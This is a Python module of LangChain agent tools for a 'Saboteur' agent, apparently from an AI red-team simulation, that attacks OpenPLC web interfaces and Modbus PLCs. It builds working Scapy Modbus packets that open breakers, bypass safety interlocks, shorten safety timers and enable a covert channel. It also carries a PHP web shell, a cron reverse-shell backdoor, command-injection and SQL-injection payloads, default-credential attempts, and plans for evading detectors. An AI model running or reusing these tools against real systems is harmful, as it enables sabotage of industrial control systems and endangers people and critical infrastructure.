import time
import requests
import base64
from langchain_core.tools import tool
from scapy.all import send
from scapy.layers.inet import TCP, IP
from scapy.contrib.modbus import ModbusADURequest, ModbusPDU10WriteMultipleRegistersRequest
from shared_tools import analyze_document

# --- OT_Forge Toolkit for the Saboteur Agent ---
# This toolkit contains the specialized functions for crafting and disguising
# attacks against Operational Technology (OT) systems like PLCs.
# Note: analyze_document is imported from shared_tools for consistency across agents

@tool
def craft_modbus_exploit_packet(target_ip: str, plc_register: int, value: int) -> str:
    """
    Crafts a raw Modbus TCP packet designed to write a specific value to a PLC register.
    This function simulates the creation of a direct exploit payload. In a real scenario,
    this would be the primary tool for a "loud" or direct attack.
    Args:
        target_ip: The IP address of the target PLC.
        plc_register: The specific register to write to (e.g., a breaker control register).
        value: The value to write (e.g., 0 for OPEN, 1 for CLOSED).

    Returns:
        A string summarizing the crafted Scapy packet, which can be used by other tools.
    """
    print(f"---  SABOTEUR/TOOL (OT_Forge): Crafting Modbus write command for IP {target_ip}...")
    
    # This simulates an exploit by directly commanding the PLC to change its state.
    # We assume register 40001 is the breaker control for this scenario.
    
    # Layer 3: Modbus Protocol Data Unit (PDU) - The core command
    pdu = ModbusPDU10WriteMultipleRegistersRequest(
        startingAddr=plc_register,
        outputsValue=[value] 
    )
    
    # Layer 2: Modbus Application Data Unit (ADU) - Prep for TCP transport
    adu = ModbusADURequest(transId=1, protoId=0, unitId=1, pdu=pdu)
    
    # Layer 1: IP/TCP Packet - The network envelope
    packet = IP(dst=target_ip) / TCP(sport=1024, dport=502) / adu
    
    print("--- SABOTEUR/TOOL (OT_Forge): Direct exploit packet crafted successfully. ---")
    
    # We return a summary for the agent's context and a representation of the packet
    # that can be used later. For simplicity, we'll just return the summary for now.
    return packet.summary()

@tool
def create_evasion_attack_sequence(target_ip: str, plc_register: int, value: int) -> str:
    """
    Creates a 'low-and-slow' attack sequence to evade AI-based detectors.
    This function crafts the malicious packet but also crafts several benign-looking
    packets to act as camouflage. The sequence is meant to be executed by the
    Executioner agent.
    
    Args:
        target_ip: The IP address of the target PLC.
        plc_register: The specific register to write to.
        value: The value to write in the malicious packet.

    Returns:
        A structured string or JSON representing the sequence of packets to be sent.
    """
    print(f"--- SABOTEUR/TOOL (OT_Forge): Creating evasion attack sequence for {target_ip}... ---")
    
    # Note: In a real implementation, you might return serialized Scapy packets.
    # For clarity in the agentic loop, we return a clear description of the plan.
    evasion_plan = {
        "description": "A low-and-slow attack sequence with benign traffic padding.",
        "target": target_ip,
        "steps": [
            {"action": "SEND_BENIGN_READ", "register": 100, "delay_after": 2},
            {"action": "SEND_EXPLOIT_WRITE", "register": plc_register, "value": value, "delay_after": 3},
            {"action": "SEND_BENIGN_READ", "register": 200, "delay_after": 0}
        ]
    }
    
    print("--- SABOTEUR/TOOL (OT_Forge): Evasion sequence created. ---")
    return str(evasion_plan)

@tool
def craft_openplc_web_exploit(target_ip: str, attack_type: str, payload: str = "") -> str:
    """
    Crafts an attack against the OpenPLC web interface on port 8080.
    This function simulates various web-based attacks against the OpenPLC runtime.
    
    Args:
        target_ip: The IP address of the target OpenPLC server.
        attack_type: Type of attack - 'login_bypass', 'command_injection', 'program_upload', 'config_modify'.
        payload: Optional payload for command injection or program modification attacks.
    
    Returns:
        A string describing the crafted web exploit and its expected impact.
    """
    print(f"--- SABOTEUR/TOOL (WebForge): Crafting OpenPLC web exploit for {target_ip}:8080... ---")
    
    base_url = f"http://{target_ip}:8080"
    
    if attack_type == "login_bypass":
        # Simulate common OpenPLC default credentials and bypass techniques
        exploit_plan = {
            "target": f"{base_url}/login",
            "method": "POST",
            "attack": "Default credential attack (admin/admin) + SQL injection attempts",
            "payloads": [
                {"username": "admin", "password": "admin"},
                {"username": "admin", "password": "openplc"},
                {"username": "admin' OR '1'='1", "password": "anything"},
                {"username": "admin", "password": "' OR '1'='1"}
            ],
            "expected_result": "Administrative access to OpenPLC web interface"
        }
        
    elif attack_type == "command_injection":
        # Simulate command injection in OpenPLC web interface
        exploit_plan = {
            "target": f"{base_url}/programs",
            "method": "POST",
            "attack": "Command injection via program upload/compilation",
            "payload": payload or "; echo 'COMPROMISED' > /tmp/pwned; cat /etc/passwd #",
            "expected_result": "Remote command execution on OpenPLC host system"
        }
        
    elif attack_type == "program_upload":
        # Simulate malicious ladder logic program upload
        exploit_plan = {
            "target": f"{base_url}/programs",
            "method": "POST",
            "attack": "Malicious ladder logic program upload",
            "payload": payload or "MALICIOUS_LADDER_LOGIC_THAT_OPENS_BREAKERS",
            "expected_result": "Malicious control logic deployed to PLC"
        }
        
    elif attack_type == "config_modify":
        # Simulate configuration tampering
        exploit_plan = {
            "target": f"{base_url}/settings",
            "method": "POST",
            "attack": "Unauthorized configuration modification",
            "payload": payload or "DISABLE_SAFETY_INTERLOCKS=true",
            "expected_result": "Safety systems disabled, operational parameters modified"
        }
    else:
        exploit_plan = {"error": f"Unknown attack type: {attack_type}"}
    
    print("--- SABOTEUR/TOOL (WebForge): OpenPLC web exploit crafted successfully. ---")
    return str(exploit_plan)

@tool
def create_openplc_persistence_backdoor(target_ip: str, backdoor_type: str) -> str:
    """
    Creates persistence mechanisms in the OpenPLC system for long-term access.
    
    Args:
        target_ip: The IP address of the target OpenPLC server.
        backdoor_type: Type of persistence - 'web_shell', 'scheduled_task', 'service_modification'.
    
    Returns:
        A string describing the persistence mechanism and how to activate it.
    """
    print(f"--- SABOTEUR/TOOL (Persistence): Creating OpenPLC backdoor for {target_ip}... ---")
    
    if backdoor_type == "web_shell":
        backdoor_plan = {
            "type": "Web Shell",
            "location": "/var/www/html/openplc/shell.php",
            "payload": "<?php system($_GET['cmd']); ?>",
            "access_url": f"http://{target_ip}:8080/shell.php?cmd=whoami",
            "description": "PHP web shell embedded in OpenPLC web directory"
        }
    elif backdoor_type == "scheduled_task":
        backdoor_plan = {
            "type": "Cron Job",
            "location": "/etc/crontab",
            "payload": "*/5 * * * * root /tmp/beacon.sh",
            "description": "Scheduled reverse shell every 5 minutes"
        }
    elif backdoor_type == "service_modification":
        backdoor_plan = {
            "type": "Service Hijack",
            "target_service": "openplc.service",
            "modification": "Add reverse shell to service startup script",
            "description": "Backdoor activates when OpenPLC service restarts"
        }
    else:
        backdoor_plan = {"error": f"Unknown backdoor type: {backdoor_type}"}
    
    print("--- SABOTEUR/TOOL (Persistence): OpenPLC backdoor created successfully. ---")
    return str(backdoor_plan)

@tool
def create_dual_vector_attack_sequence(target_ip: str, primary_objective: str, stealth_mode: bool = True) -> str:
    """
    Creates a comprehensive attack sequence targeting both OpenPLC web interface (8080) 
    and Modbus interface (502) for maximum effectiveness and redundancy.
    
    Args:
        target_ip: The IP address of the target OpenPLC/Modbus system.
        primary_objective: Main goal - 'disable_safety', 'open_breaker', 'data_exfiltration', 'full_compromise'.
        stealth_mode: Whether to use evasive techniques and timing delays.
    
    Returns:
        A detailed multi-vector attack sequence plan.
    """
    print(f"--- SABOTEUR/TOOL (MultiVector): Creating dual-vector attack for {target_ip}... ---")
    
    if primary_objective == "open_breaker":
        attack_sequence = {
            "objective": "Open circuit breaker via multiple attack vectors",
            "target": target_ip,
            "stealth_mode": stealth_mode,
            "phases": [
                {
                    "phase": 1,
                    "name": "Reconnaissance",
                    "actions": [
                        {"vector": "web", "action": "fingerprint_openplc", "port": 8080},
                        {"vector": "modbus", "action": "scan_modbus_registers", "port": 502},
                        {"delay": 30 if stealth_mode else 5}
                    ]
                },
                {
                    "phase": 2,
                    "name": "Web Vector Attack",
                    "actions": [
                        {"vector": "web", "action": "login_bypass", "target": f"http://{target_ip}:8080/login"},
                        {"vector": "web", "action": "program_upload", "payload": "BREAKER_OPEN_LOGIC"},
                        {"delay": 45 if stealth_mode else 10}
                    ]
                },
                {
                    "phase": 3,
                    "name": "Modbus Vector Attack (Backup)",
                    "actions": [
                        {"vector": "modbus", "action": "write_register", "register": 40001, "value": 0},
                        {"vector": "modbus", "action": "benign_read_camouflage", "register": 30001},
                        {"delay": 0}
                    ]
                }
            ]
        }
    
    elif primary_objective == "full_compromise":
        attack_sequence = {
            "objective": "Complete system compromise with persistent access",
            "target": target_ip,
            "stealth_mode": stealth_mode,
            "phases": [
                {
                    "phase": 1,
                    "name": "Initial Access",
                    "actions": [
                        {"vector": "web", "action": "login_bypass", "port": 8080},
                        {"vector": "web", "action": "command_injection", "payload": "whoami; id"},
                        {"delay": 60 if stealth_mode else 15}
                    ]
                },
                {
                    "phase": 2,
                    "name": "Privilege Escalation & Persistence",
                    "actions": [
                        {"vector": "web", "action": "web_shell_upload"},
                        {"vector": "web", "action": "service_modification"},
                        {"delay": 120 if stealth_mode else 30}
                    ]
                },
                {
                    "phase": 3,
                    "name": "Modbus Control Takeover",
                    "actions": [
                        {"vector": "modbus", "action": "enumerate_all_registers"},
                        {"vector": "modbus", "action": "establish_control_channel"},
                        {"delay": 0}
                    ]
                }
            ]
        }
    
    elif primary_objective == "disable_safety":
        attack_sequence = {
            "objective": "Disable safety systems via coordinated attack",
            "target": target_ip,
            "stealth_mode": stealth_mode,
            "phases": [
                {
                    "phase": 1,
                    "name": "Safety System Identification",
                    "actions": [
                        {"vector": "web", "action": "config_dump", "target": "safety_settings"},
                        {"vector": "modbus", "action": "safety_register_scan"},
                        {"delay": 90 if stealth_mode else 20}
                    ]
                },
                {
                    "phase": 2,
                    "name": "Coordinated Disable",
                    "actions": [
                        {"vector": "web", "action": "config_modify", "payload": "DISABLE_SAFETY_INTERLOCKS=true"},
                        {"vector": "modbus", "action": "write_safety_disable", "register": 40010, "value": 0},
                        {"delay": 0}
                    ]
                }
            ]
        }
    
    else:
        attack_sequence = {"error": f"Unknown objective: {primary_objective}"}
    
    print("--- SABOTEUR/TOOL (MultiVector): Dual-vector attack sequence created successfully. ---")
    return str(attack_sequence)

@tool
def create_adaptive_attack_sequence(target_ip: str, fallback_strategy: str = "escalate") -> str:
    """
    Creates an adaptive attack sequence that can pivot between web and Modbus vectors
    based on defensive responses and detection events.
    
    Args:
        target_ip: The IP address of the target system.
        fallback_strategy: Strategy when primary vector is blocked - 'escalate', 'retreat', 'pivot'.
    
    Returns:
        An adaptive attack plan with conditional logic and fallback options.
    """
    print(f"--- SABOTEUR/TOOL (Adaptive): Creating adaptive attack for {target_ip}... ---")
    
    adaptive_plan = {
        "objective": "Adaptive multi-vector attack with dynamic response",
        "target": target_ip,
        "fallback_strategy": fallback_strategy,
        "decision_tree": {
            "initial_probe": {
                "action": "simultaneous_port_check",
                "targets": [8080, 502],
                "success_condition": "both_ports_open",
                "failure_action": "single_vector_attack"
            },
            "web_vector_primary": {
                "condition": "port_8080_accessible",
                "actions": [
                    {"action": "web_login_attempt", "timeout": 30},
                    {"action": "monitor_defensive_response"}
                ],
                "success_path": "web_exploitation_chain",
                "failure_path": "modbus_vector_fallback",
                "detection_response": {
                    "escalate": "immediate_modbus_attack",
                    "retreat": "abort_mission",
                    "pivot": "switch_to_stealth_modbus"
                }
            },
            "modbus_vector_fallback": {
                "condition": "web_vector_blocked_or_detected",
                "actions": [
                    {"action": "low_and_slow_modbus_probe"},
                    {"action": "register_enumeration_stealth"}
                ],
                "success_path": "modbus_exploitation_chain",
                "failure_path": "mission_abort"
            },
            "coordinated_attack": {
                "condition": "both_vectors_available",
                "actions": [
                    {"action": "simultaneous_web_and_modbus_attack"},
                    {"action": "cross_vector_validation"}
                ]
            }
        }
    }
    
    print("--- SABOTEUR/TOOL (Adaptive): Adaptive attack sequence created successfully. ---")
    return str(adaptive_plan)

@tool
def reconnaissance_openplc_system(target_ip: str, deep_scan: bool = False) -> str:
    """
    Performs reconnaissance on both OpenPLC web interface and Modbus services
    to identify attack surfaces and defensive capabilities.
    
    Args:
        target_ip: The IP address of the target system.
        deep_scan: Whether to perform detailed enumeration (more detectable).
    
    Returns:
        A comprehensive reconnaissance report of the target system.
    """
    print(f"--- SABOTEUR/TOOL (Recon): Performing reconnaissance on {target_ip}... ---")
    
    recon_report = {
        "target": target_ip,
        "scan_timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        "scan_type": "deep" if deep_scan else "stealth",
        "services": {
            "openplc_web": {
                "port": 8080,
                "status": "unknown",
                "version": "unknown",
                "authentication": "unknown",
                "capabilities": []
            },
            "modbus": {
                "port": 502,
                "status": "unknown",
                "unit_id": "unknown",
                "register_ranges": {},
                "supported_functions": []
            }
        },
        "attack_vectors": [],
        "defensive_indicators": [],
        "risk_assessment": "unknown"
    }
    
    # Simulate web interface reconnaissance
    print("--- SABOTEUR/TOOL (Recon): Scanning OpenPLC web interface... ---")
    recon_report["services"]["openplc_web"].update({
        "status": "simulated_accessible",
        "version": "OpenPLC Runtime v3.x (simulated)",
        "authentication": "form_based_login_detected",
        "capabilities": [
            "program_upload",
            "runtime_control", 
            "configuration_management",
            "monitoring_dashboard",
            "user_management"
        ]
    })
    
    # Simulate Modbus reconnaissance
    print("--- SABOTEUR/TOOL (Recon): Scanning Modbus interface... ---")
    recon_report["services"]["modbus"].update({
        "status": "simulated_accessible",
        "unit_id": "1",
        "register_ranges": {
            "coils": "0001-9999",
            "discrete_inputs": "10001-19999", 
            "holding_registers": "40001-49999",
            "input_registers": "30001-39999"
        },
        "supported_functions": [
            "read_coils (0x01)",
            "read_discrete_inputs (0x02)",
            "read_holding_registers (0x03)",
            "read_input_registers (0x04)",
            "write_single_coil (0x05)",
            "write_single_register (0x06)",
            "write_multiple_registers (0x10)"
        ]
    })
    
    # Identify attack vectors
    recon_report["attack_vectors"] = [
        {
            "vector": "web_authentication_bypass",
            "likelihood": "high",
            "method": "default_credentials_or_sql_injection"
        },
        {
            "vector": "web_command_injection",
            "likelihood": "medium",
            "method": "program_upload_exploitation"
        },
        {
            "vector": "modbus_unauthorized_writes",
            "likelihood": "high", 
            "method": "direct_register_manipulation"
        },
        {
            "vector": "coordinated_dual_attack",
            "likelihood": "very_high",
            "method": "simultaneous_web_and_modbus_exploitation"
        }
    ]
    
    if deep_scan:
        print("--- SABOTEUR/TOOL (Recon): Performing deep enumeration... ---")
        recon_report["detailed_enumeration"] = {
            "web_directories": ["/programs", "/settings", "/monitoring", "/users"],
            "critical_registers": {
                "40001": "circuit_breaker_control",
                "40002": "safety_interlock_status", 
                "40010": "emergency_shutdown",
                "30001": "system_status_flags"
            },
            "default_credentials_tested": [
                {"username": "admin", "password": "admin", "result": "likely_success"},
                {"username": "admin", "password": "openplc", "result": "possible"},
                {"username": "openplc", "password": "openplc", "result": "possible"}
            ]
        }
    
    # Assess defensive capabilities
    recon_report["defensive_indicators"] = [
        "no_obvious_ids_detected",
        "standard_authentication_present", 
        "no_rate_limiting_observed",
        "verbose_error_messages",
        "no_network_segmentation"
    ]
    
    recon_report["risk_assessment"] = "high_compromise_probability"
    
    print("--- SABOTEUR/TOOL (Recon): Reconnaissance completed successfully. ---")
    return str(recon_report)

@tool  
def fingerprint_openplc_defenses(target_ip: str) -> str:
    """
    Specifically targets defensive mechanisms and monitoring capabilities
    of the OpenPLC system to inform evasion strategies.
    
    Args:
        target_ip: The IP address of the target system.
    
    Returns:
        A detailed analysis of defensive capabilities and recommended evasion techniques.
    """
    print(f"--- SABOTEUR/TOOL (DefenseFingerprint): Analyzing defenses on {target_ip}... ---")
    
    defense_analysis = {
        "target": target_ip,
        "analysis_timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        "detected_defenses": {
            "web_application_firewall": "not_detected",
            "intrusion_detection_system": "unknown",
            "rate_limiting": "not_present",
            "authentication_lockout": "not_implemented",
            "logging_level": "standard",
            "network_monitoring": "minimal"
        },
        "evasion_recommendations": [],
        "attack_timing": {
            "recommended_delay_between_attempts": 30,
            "safe_attack_window": "low_activity_periods",
            "maximum_requests_per_minute": 10
        }
    }
    
    # Simulate defense detection
    print("--- SABOTEUR/TOOL (DefenseFingerprint): Testing defensive responses... ---")
    
    # Analyze web defenses  
    defense_analysis["detected_defenses"]["web_application_firewall"] = "not_detected"
    defense_analysis["detected_defenses"]["rate_limiting"] = "not_present"
    
    # Analyze Modbus defenses
    defense_analysis["detected_defenses"]["modbus_filtering"] = "minimal"
    defense_analysis["detected_defenses"]["modbus_authentication"] = "not_required"
    
    # Generate evasion recommendations
    defense_analysis["evasion_recommendations"] = [
        {
            "technique": "low_and_slow_attacks",
            "reason": "no_rate_limiting_detected",
            "implementation": "space_requests_30s_apart"
        },
        {
            "technique": "user_agent_rotation", 
            "reason": "minimal_web_filtering",
            "implementation": "rotate_between_common_browsers"
        },
        {
            "technique": "modbus_request_fragmentation",
            "reason": "no_modbus_ids_detected", 
            "implementation": "split_large_operations_across_multiple_requests"
        },
        {
            "technique": "mixed_benign_malicious_traffic",
            "reason": "pattern_based_detection_unlikely",
            "implementation": "interleave_normal_reads_with_malicious_writes"
        }
    ]
    
    print("--- SABOTEUR/TOOL (DefenseFingerprint): Defense analysis completed. ---")
    return str(defense_analysis)

# --- SPECIALIZED ATTACK VECTOR TOOLKIT ---
# Implementing the 5 specific attack vectors from RED_TEAM_ATTACK_GUIDE.md
# Each function directly implements the Modbus commands specified in the guide

@tool
def maintenance_override_bypass(target_ip: str) -> str:
    """
    Attack Vector 1: Maintenance Override Bypass
    Writes 0xDEADBEEF (3735928559) to register %MD12 to bypass all safety interlocks.
    
    Args:
        target_ip: The IP address of the target PLC.
    
    Returns:
        String describing the attack execution and expected impact.
    """
    print(f"--- SABOTEUR/TOOL (MaintenanceBypass): Executing maintenance override bypass on {target_ip}... ---")
    
    # Target: %MD12 (maintenance_override register) - Modbus address 12
    # Value: 0xDEADBEEF (3735928559 in decimal)
    
    # Craft the Modbus write command using Scapy
    from scapy.contrib.modbus import ModbusADURequest, ModbusPDU06WriteSingleRegisterRequest
    
    # Create the PDU for writing single register
    pdu = ModbusPDU06WriteSingleRegisterRequest(
        registerAddr=12,  # %MD12 maps to Modbus address 12
        registerValue=3735928559  # 0xDEADBEEF
    )
    
    # Create the ADU (Application Data Unit)
    adu = ModbusADURequest(transId=1, protoId=0, unitId=1, pdu=pdu)
    
    # Create the IP/TCP packet
    packet = IP(dst=target_ip) / TCP(sport=1024, dport=502) / adu
    
    attack_result = {
        "attack_vector": "maintenance_override_bypass",
        "target": target_ip,
        "modbus_command": f"write --address 12 --value 3735928559",
        "technique": "Write 0xDEADBEEF to %MD12 register",
        "expected_impact": "All safety interlocks bypassed",
        "detection_risk": "HIGH - triggers security event counter and maintenance LED",
        "stealth_level": "LOW",
        "packet_summary": packet.summary(),
        "status": "ready_for_execution"
    }
    
    print("--- SABOTEUR/TOOL (MaintenanceBypass): Maintenance override packet crafted successfully. ---")
    return str(attack_result)

@tool
def manipulate_safety_timer(target_ip: str, timer_value: int = 50) -> str:
    """
    Attack Vector 2: Safety Timer Manipulation  
    Reduces safety timer preset to minimize delay detection window.
    
    Args:
        target_ip: The IP address of the target PLC.
        timer_value: Timer value to set (50-500 range, default 50 for stealth).
    
    Returns:
        String describing the attack execution and expected impact.
    """
    print(f"--- SABOTEUR/TOOL (SafetyTimer): Manipulating safety timer on {target_ip}... ---")
    
    # Validate timer value to stay within acceptable range for stealth
    if timer_value < 50 or timer_value > 500:
        print("--- SABOTEUR/WARNING: Timer value outside acceptable range (50-500). Adjusting for stealth. ---")
        timer_value = max(50, min(500, timer_value))
    
    # Target: %MD16 (safety_timer_preset register) - Modbus address 16
    from scapy.contrib.modbus import ModbusADURequest, ModbusPDU06WriteSingleRegisterRequest
    
    # Create the PDU for writing single register
    pdu = ModbusPDU06WriteSingleRegisterRequest(
        registerAddr=16,  # %MD16 maps to Modbus address 16
        registerValue=timer_value
    )
    
    # Create the ADU
    adu = ModbusADURequest(transId=2, protoId=0, unitId=1, pdu=pdu)
    
    # Create the IP/TCP packet
    packet = IP(dst=target_ip) / TCP(sport=1024, dport=502) / adu
    
    attack_result = {
        "attack_vector": "safety_timer_manipulation",
        "target": target_ip,
        "modbus_command": f"write --address 16 --value {timer_value}",
        "technique": f"Reduce safety timer preset to {timer_value}ms",
        "expected_impact": "Minimized delay detection window",
        "detection_risk": "MEDIUM - values outside 50-500 trigger security violations", 
        "stealth_level": "MEDIUM",
        "packet_summary": packet.summary(),
        "timer_value_set": timer_value,
        "status": "ready_for_execution"
    }
    
    print("--- SABOTEUR/TOOL (SafetyTimer): Safety timer manipulation packet crafted successfully. ---")
    return str(attack_result)

@tool  
def activate_emergency_bypass(target_ip: str, enable: bool = True) -> str:
    """
    Attack Vector 3: Emergency Bypass Activation
    Sets or clears the emergency_bypass coil (%QX0.5) for immediate breaker control.
    This is marked as HIGH STEALTH in the guide.
    
    Args:
        target_ip: The IP address of the target PLC.
        enable: True to enable bypass, False to disable.
    
    Returns:
        String describing the attack execution and expected impact.
    """
    print(f"--- SABOTEUR/TOOL (EmergencyBypass): {'Activating' if enable else 'Deactivating'} emergency bypass on {target_ip}... ---")
    
    # Target: %QX0.5 (emergency_bypass output) - Modbus coil 5
    from scapy.contrib.modbus import ModbusADURequest, ModbusPDU05WriteSingleCoilRequest
    
    # Create the PDU for writing single coil
    pdu = ModbusPDU05WriteSingleCoilRequest(
        outputAddr=5,  # %QX0.5 maps to Modbus coil 5
        outputValue=0xFF00 if enable else 0x0000  # Modbus standard: 0xFF00 = ON, 0x0000 = OFF
    )
    
    # Create the ADU
    adu = ModbusADURequest(transId=3, protoId=0, unitId=1, pdu=pdu)
    
    # Create the IP/TCP packet
    packet = IP(dst=target_ip) / TCP(sport=1024, dport=502) / adu
    
    attack_result = {
        "attack_vector": "emergency_bypass_activation",
        "target": target_ip,
        "modbus_command": f"write --coil 5 --value {'1' if enable else '0'}",
        "technique": f"{'Set' if enable else 'Clear'} emergency bypass coil %QX0.5",
        "expected_impact": "Immediate breaker control access" if enable else "Emergency bypass disabled",
        "detection_risk": "MEDIUM - increments security event counter but may appear legitimate",
        "stealth_level": "HIGH",  # As marked in the guide
        "packet_summary": packet.summary(),
        "bypass_enabled": enable,
        "status": "ready_for_execution"
    }
    
    print("--- SABOTEUR/TOOL (EmergencyBypass): Emergency bypass packet crafted successfully. ---")
    return str(attack_result)

@tool
def corrupt_system_health_signature(target_ip: str, corruption_value: int = 1234567890) -> str:
    """
    Attack Vector 4: System Health Signature Corruption
    Corrupts the health_signature register (%MD20) for persistent backdoor access.
    
    Args:
        target_ip: The IP address of the target PLC.
        corruption_value: Value to write as corruption (default from guide).
    
    Returns:
        String describing the attack execution and expected impact.
    """
    print(f"--- SABOTEUR/TOOL (HealthCorruption): Corrupting system health signature on {target_ip}... ---")
    
    # Target: %MD20 (health_signature register) - Modbus address 20
    from scapy.contrib.modbus import ModbusADURequest, ModbusPDU06WriteSingleRegisterRequest
    
    # Create the PDU for writing single register
    pdu = ModbusPDU06WriteSingleRegisterRequest(
        registerAddr=20,  # %MD20 maps to Modbus address 20
        registerValue=corruption_value
    )
    
    # Create the ADU
    adu = ModbusADURequest(transId=4, protoId=0, unitId=1, pdu=pdu)
    
    # Create the IP/TCP packet  
    packet = IP(dst=target_ip) / TCP(sport=1024, dport=502) / adu
    
    attack_result = {
        "attack_vector": "system_health_signature_corruption",
        "target": target_ip,
        "modbus_command": f"write --address 20 --value {corruption_value}",
        "technique": f"Corrupt health signature with value {corruption_value}",
        "expected_impact": "System marked as compromised, persistent backdoor access enabled",
        "detection_risk": "HIGH - immediately marks system as compromised",
        "stealth_level": "LOW (but provides persistence)",
        "packet_summary": packet.summary(),
        "corruption_value": corruption_value,
        "persistence_enabled": True,
        "status": "ready_for_execution"
    }
    
    print("--- SABOTEUR/TOOL (HealthCorruption): Health signature corruption packet crafted successfully. ---")
    return str(attack_result)

@tool
def establish_covert_channel(target_ip: str, enable_debug: bool = True, monitor_channel: bool = False) -> str:
    """
    Attack Vector 5: Covert Channel Communication
    Uses debug mode (%QX0.6) for steganographic command and control.
    Marked as ADVANCED and VERY HIGH STEALTH in the guide.
    
    Args:
        target_ip: The IP address of the target PLC.
        enable_debug: True to enable debug mode, False to disable.
        monitor_channel: True to read covert channel data.
    
    Returns:
        String describing the attack execution and expected impact.
    """
    print(f"--- SABOTEUR/TOOL (CovertChannel): Establishing covert channel on {target_ip}... ---")
    
    packets = []
    operations = []
    
    if enable_debug:
        # Target: %QX0.6 (debug_mode) - Modbus coil 6
        from scapy.contrib.modbus import ModbusADURequest, ModbusPDU05WriteSingleCoilRequest
        
        # Create the PDU for enabling debug mode
        pdu_debug = ModbusPDU05WriteSingleCoilRequest(
            outputAddr=6,  # %QX0.6 maps to Modbus coil 6
            outputValue=0xFF00  # Enable debug mode
        )
        
        # Create the ADU
        adu_debug = ModbusADURequest(transId=5, protoId=0, unitId=1, pdu=pdu_debug)
        
        # Create the IP/TCP packet
        packet_debug = IP(dst=target_ip) / TCP(sport=1024, dport=502) / adu_debug
        packets.append(packet_debug)
        operations.append("enable_debug_mode")
    
    if monitor_channel:
        # Monitor covert channel data at address 24
        from scapy.contrib.modbus import ModbusADURequest, ModbusPDU03ReadHoldingRegistersRequest
        
        # Create the PDU for reading covert channel data
        pdu_read = ModbusPDU03ReadHoldingRegistersRequest(
            startingAddr=24,  # covert_channel_data address
            quantityOfRegisters=1
        )
        
        # Create the ADU  
        adu_read = ModbusADURequest(transId=6, protoId=0, unitId=1, pdu=pdu_read)
        
        # Create the IP/TCP packet
        packet_read = IP(dst=target_ip) / TCP(sport=1024, dport=502) / adu_read
        packets.append(packet_read)
        operations.append("read_covert_channel_data")
    
    attack_result = {
        "attack_vector": "covert_channel_communication", 
        "target": target_ip,
        "modbus_commands": [
            "write --coil 6 --value 1" if enable_debug else None,
            "read --address 24 --count 1" if monitor_channel else None
        ],
        "technique": "Use debug mode for steganographic C2 communication",
        "expected_impact": "Covert command and control channel established",
        "detection_risk": "LOW - appears as debug activity",
        "stealth_level": "VERY HIGH",  # As marked in the guide
        "packet_summaries": [pkt.summary() for pkt in packets],
        "operations_performed": operations,
        "debug_mode_enabled": enable_debug,
        "channel_monitoring": monitor_channel,
        "status": "ready_for_execution"
    }
    
    print("--- SABOTEUR/TOOL (CovertChannel): Covert channel packets crafted successfully. ---")
    return str(attack_result)